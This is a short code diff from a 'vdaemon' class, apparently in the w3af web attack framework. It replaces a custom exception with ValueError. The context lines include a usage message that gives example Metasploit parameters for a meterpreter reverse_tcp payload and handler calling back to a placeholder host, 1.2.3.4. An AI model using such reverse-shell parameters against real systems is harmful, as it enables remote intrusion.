@@ -82,7 +82,7 @@ class vdaemon(object):
         msg += '    linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 | exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 E'
         
         if '|' not in user_defined_parameters:
-            raise w3afException( msg )
+            raise ValueError( msg )
         
         msfpayload_parameters = user_defined_parameters[:user_defined_parameters.index('|')]
         msfcli_parameters = user_defined_parameters[user_defined_parameters.index('|')+1:]
